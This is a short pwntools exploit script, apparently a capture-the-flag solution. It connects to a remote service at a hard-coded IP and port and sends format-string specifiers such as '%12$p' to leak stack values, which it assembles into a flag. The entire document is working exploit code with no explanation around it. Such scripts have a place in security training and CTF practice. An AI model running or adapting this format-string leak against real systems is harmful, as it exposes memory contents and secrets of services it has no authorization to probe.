#!/usr/bin/env python3
from pwn import *
import sys
import pwnlib.shellcraft
import pwnlib

debug = not False

c = 0
pwn_file = "./fmtstr"

elf = ELF(pwn_file)
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 100
flag = b''
for i in range(12, 20):
    try:
        #c = process(pwn_file)
        c = remote('140.110.112.77', '6127')
        print(i)
        c.sendline(flat({0:"%{}$p".format(i)}))
        flag += p64(int(c.recv(), 16))
        c.close()
    except EOFError as error:
        pass

print(flag)
